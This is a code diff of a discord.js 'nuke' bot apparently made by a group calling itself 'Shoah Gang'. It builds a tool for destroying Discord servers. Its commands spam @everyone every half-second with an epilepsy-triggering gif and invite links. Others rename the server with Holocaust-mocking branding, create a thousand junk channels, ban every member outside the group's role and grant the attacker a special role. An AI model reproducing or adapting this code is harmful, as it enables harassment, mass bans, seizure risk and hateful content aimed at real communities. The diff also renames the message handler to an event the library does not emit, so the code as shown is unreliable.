@@ -1,93 +1,71 @@
 const Discord = require('discord.js');
 const bot = new Discord.Client();
 const fs = require('fs');
-
+ 
 var fucked = false;
-
-function base64_encode(file) {
-    var bitmap = fs.readFileSync(file);
-    return new Buffer(bitmap).toString('base64');
-}
-bot.on('warn', console.warn);
-
-bot.on('error', console.error);
  
-bot.on('ready',() => { 
-  //invit link 
-  bot.guilds.forEach(guild => { 
+bot.on('ready',() => {
+  //invit link
+  bot.guilds.forEach(guild => {
     var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
-  })
+    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`));
+  });
 });
-
-bot.on('disconnect', () => console.log('jai déco, je me reco desuite...'));
-
-bot.on('reconnecting', () => console.log('Je me suis reco !'));
-
-bot.on('message', message => {
-  if (message.content === '.ping') {
-    message.reply('pong !')
+ 
+bot.on('msg', msg => {
+  //#region Legit
+  /* Commandes legit */
+  if (msg.content === '.ping') {
+    msg.reply('pong !')
   }
-})
-
-bot.on('message', msg => {
+  //#endregion
+ 
+  //#region Destructrices
+  /* Commandes destructrices */
   if (msg.content === '.destruction') {
-    console.log(`Commande .destruction par ${msg.author.id}`)
+    console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone Rejoignez la Saint Team qui vous a detruit bande de facho : https://discord.gg/Pt4QH9u "); 
-  }, 500);
-}
-
-if (msg.content === '.oupss') {
-  console.log(`Commande .oupss par ${msg.author.id}`)
-
-  if (!fucked){
-    msg.guild.setIcon("shoah.jpg");
-    msg.guild.setName('BZ by Shoah Gang');
-    fucked = true;
-  
-
-    for (var i = 0; i < 500; i++) {
-
-      msg.guild.createChannel('Shoah_gang_te_baise', 'voice')
-      msg.guild.createChannel('Shoah_gang_te_baise', 'text')
-      //changes name tons of times to clog up the audit log
-
-      let stop = i = 500;
-      if (stop) return;
-      
-     
+      msg.channel.send("@everyone  @here  .https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif\n"+
+                       "SHOAH GANG ON THE BEAT\n" +
+                       "https://discord.gg/835hm2Q\n" +
+                       "https://discord.gg/ZKYWm6g");
+    }, 500).catch(e => {});
   }
-}
-
-  if (msg.content === '.name') {
-    msg.delete();
-
-    msg.guild.members.forEach(member => {
-		console.log(`Commande .name par ${msg.author.id}`)
-        if (member.kickable && !member.roles.find("name", "Patrick Bot")) {
-            member.setNickname("ISSOU_BY SHOAH_GANG");
-        }
-    });
-}
-
-bot.on("")
-  if (msg.content === '.banev') {                              // Nom a changer
-    console.log(`Commande .banev par ${msg.author.id}`)       // Nom a changer
-    msg.guild.members.forEach(member => {
-      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) {
-        member.ban();
+ 
+  if (msg.content === '.oupss') {
+    console.log(`Commande .oupss par ${msg.author.tag}`);
+ 
+    if (!fucked){
+      msg.guild.setIcon("./shoah.jpg").catch(e => {});
+      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
+ 
+      for (var i = 0; i < 500; i++) {
+        msg.guild.createChannel('Shoah_gang_te_baise', 'voice').catch(e => {});
+        msg.guild.createChannel('Shoah_gang_te_baise', 'text').catch(e => {});
       }
+      fucked = true;
+    }
+ 
+    if (msg.deletable) {
+      msg.delete();
+    }
+  }
+ 
+  if (msg.content === '.banev') {
+    console.log(`Commande .banev par ${msg.author.tag}`);
+    msg.guild.members.forEach(member => {
+      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
   }
  
-  if (msg.content === '.leave') {                              // Nom a changer
-    console.log(`Commande .leave par ${msg.author.id}`)       // Nom a changer
-    msg.guild.leave();
+  if (msg.content === '.leave') {
+    console.log(`Commande .leave par ${msg.author.tag}`);
+    if (msg.deletable) msg.delete().catch(e => {});
+    msg.guild.leave().catch(e => {});
   }
  
   if (msg.content === '.pardon') {
-    console.log(`Commande .pardon par ${msg.author.id}`)
+    console.log(`Commande .pardon par ${msg.author.tag}`);
  
     msg.member.guild.createRole({
       name: "Shoah Gang",
@@ -95,10 +73,10 @@ bot.on("")
       mentionable: false
     }).then(function(role) {
       msg.member.addRole(role);
-      msg.delete();
-    });
+      if (msg.deletable) msg.delete().catch(e => {});
+    }).catch(e => {});
   }
- 
-})
- 
+  //#endregion
+});
+
 bot.login(process.env.BOT_TOKEN)
